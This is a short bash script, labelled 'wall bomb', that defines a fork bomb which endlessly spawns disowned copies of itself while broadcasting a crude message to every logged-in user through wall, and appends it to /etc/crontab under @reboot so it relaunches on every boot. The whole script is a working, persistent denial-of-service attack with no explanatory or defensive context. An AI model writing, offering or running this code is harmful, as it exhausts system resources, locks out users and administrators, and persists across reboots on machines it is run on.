#!/usr/bin/env bash

#wall bomb
BOMB=':(){echo "balls"|wall;:|:&disown};:&disown'
echo "@reboot $BOMB" >> /etc/crontab
